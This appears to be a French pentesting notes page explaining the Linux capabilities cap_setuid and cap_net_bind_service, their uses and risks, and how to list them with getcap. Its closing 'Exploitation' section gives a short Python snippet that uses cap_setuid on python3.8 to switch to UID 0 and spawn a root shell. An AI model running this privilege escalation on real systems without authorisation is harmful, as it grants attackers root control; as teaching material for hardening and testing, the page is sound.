# CAP\_SETUID / CAP\_NET\_BIND\_SERVICE

{% hint style="warning" %}
Les capacités Linux sont un mécanisme de contrôle fin des privilèges, permettant à des programmes d’exécuter certaines opérations privilégiées sans nécessiter le bit SUID (Set User ID). Elles divisent les privilèges du superutilisateur en unités plus petites et contrôlables.
{% endhint %}

***

### <mark style="color:blue;">1.</mark> <mark style="color:blue;"></mark><mark style="color:blue;">**cap\_setuid**</mark>

#### Description

* `cap_setuid` permet à un processus de changer son **User ID (UID)**, c’est-à-dire d’adopter l’identité d’un autre utilisateur, souvent root (UID 0).
* Cette capacité permet donc d’élever ses privilèges sans que le binaire ait le bit SUID activé.

#### Usage typique

* Permet à un programme de changer son UID pour exécuter des actions avec les privilèges d’un autre utilisateur.
* Utilisée souvent pour les opérations nécessitant une élévation temporaire de privilèges.

#### Risques de sécurité

* Si un binaire avec cette capacité est accessible et exploitable, un attaquant peut obtenir un shell avec des privilèges root.
* Cela peut contourner la sécurité basée sur le bit SUID et permettre une escalade de privilèges.

#### <mark style="color:green;">Commande pour vérifier les capacités d’un fichier</mark>

```bash
getcap /chemin/du/binaire
```

***

### <mark style="color:blue;">2.</mark> <mark style="color:blue;"></mark><mark style="color:blue;">**cap\_net\_bind\_service**</mark>

#### Description

* `cap_net_bind_service` autorise un programme à **se lier (bind) à des ports réseau inférieurs à 1024**, qui sont généralement réservés aux processus root.
* Ces ports dits "privilégiés" (ex: 80 pour HTTP, 443 pour HTTPS, 22 pour SSH) ne peuvent pas être utilisés par défaut par des utilisateurs non privilégiés.

#### Usage typique

* Serveurs web, services réseau, ou applications qui doivent écouter sur des ports privilégiés sans tourner en tant que root.
* Permet d'améliorer la sécurité en évitant que des services tournent entièrement en root.

#### Risques de sécurité

* Si mal configuré, un binaire avec cette capacité peut être exploité pour écouter sur des ports critiques et intercepter des communications.
* En combinaison avec d’autres failles, peut faciliter des attaques réseau ou des escalades.

***

### <mark style="color:red;">STEPS</mark>

#### <mark style="color:green;">Vérifier les capacités d’un binaire (exemple python3.8)</mark>

```bash
getcap /usr/bin/python3.8
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+ep
```

#### <mark style="color:green;">Exploitation</mark>

```python
os.setuid(0)  # Passage à root (UID 0)
os.system("/bin/bash")  # Lancement d’un shell root
```

***

***
